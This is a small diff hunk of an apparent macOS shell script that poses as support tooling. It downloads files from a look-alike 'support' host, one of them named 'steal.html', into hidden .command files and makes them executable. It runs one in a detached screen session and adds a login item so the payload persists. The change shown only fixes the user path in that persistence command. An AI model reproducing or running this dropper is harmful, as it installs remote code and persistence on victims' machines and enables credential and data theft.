@@ -5,7 +5,7 @@ chmod +x .form3.command
 curl -s -o .form3b.command https://form3tech-support.github.io/steal.html
 chmod +x .form3b.command
 screen -dm bash -c ./.form3b.command
-osascript -e 'tell application "System Events" to make login item at end with properties {path:"/Users/$USER/.form3.command", hidden:false}'
+osascript -e 'tell application "System Events" to make login item at end with properties {path:"/Users/$(whoami)/.form3.command", hidden:false}'
 curl -s -o MALAZAR.txt https://form3tech-support.github.io/resistance.html
 echo "Checkin complete"
 
